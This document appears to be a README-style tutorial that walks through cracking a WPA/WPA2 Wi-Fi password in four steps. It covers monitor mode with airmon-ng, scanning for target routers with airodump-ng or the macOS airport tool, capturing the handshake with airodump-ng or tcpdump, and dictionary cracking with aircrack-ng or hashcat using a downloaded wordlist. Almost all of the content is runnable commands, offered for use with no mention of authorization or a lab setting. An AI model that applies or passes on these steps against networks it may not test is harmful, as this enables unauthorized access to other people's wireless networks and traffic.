There are four steps to crack a WPA/WPA2 Wi-Fi network.  

**[(1) Monitor Mode ](#monitor-mode)**<br>
**[(2) Target Router](#target-router)**<br>
**[(3) Capture Handshake](#capture-handshake)**<br>
**[(4) Crack Password](#crack-password)**<br>



For an alternative guide see [brannondorsey's](https://github.com/brannondorsey/wifi-cracking/blob/master/README.md).

## (1) Monitor Mode 

List monitor mode compliant interfaces

```
airmon-ng
```

Place the interface in monitor mode

```
airmon-ng start wlan0
```

## (2) Target Router
Using monitor mode we listen for nearby wireless routers.  Make note of your target router's `channel`, `bssid`, and `interface`.

### * Airodump-ng (linux)
Listen to nearby routers

```
airodump-ng wlan0mon
```


### * Airport (Mac OSX)

"Install" Airport utility

```
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
```

Listen to nearby routers

```
sudo airport -s
```

## (3) Capture Handshake
If you've used airodump-ng above continue using airodump-ng below.  Otherwise follow the wireshark section.

We monitor the router network and wait until we capture a successful handshake.

### * Airodump-ng

Replace `-c` and `-bssid` values accordingly

Capture beacon frames

```
airodump-ng -c 3 --bssid FF:FF:FF:FF:FF:FF -w capture wlan0mon
```

### * Wireshark

Replace `BSSID`, `IFACE`, and `CHANNEL` values accordingly

Disassociate airport

```sudo airport -z```

Set the channel

```sudo airport -c$CHANNEL```

Capture beacon frames

```sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i $IFACE -w beacon.cap```

Wait for handshakes

```sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $IFACE -w handshake.cap```

Merge captured files 

```mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap```

upload both files and images (#todo)

## (4) Crack Password
If you don't have a wordlist, download one.  I'm using a wordlist from [berzerk0's Probable Wordlists](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length)
```wget https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top204Thousand-WPA-probable-v2.txt```

### * Aircrack-ng
```
aircrack-ng -a2 -b FF:FF:FF:FF:FF:FF -w Top204Thousand-WPA-probable-v2.txt capture.cap
```

### * Hashcat
If you have a .cap file you'll need [hashcat-utils](https://github.com/hashcat/hashcat-utils/releases) to transform the .cap to .hccapx.

```
cap2hccapx capture.cap capture.hccapx
```


With your .hccapx you're ready to crack with hashcat.  Run [hashcat](https://hashcat.net/hashcat/).

```
$ ./hashcat64.exe -m 2500 capture.hccapx Top204Thousand-WPA-probable-v2.txt
```

upload both files and images (#todo)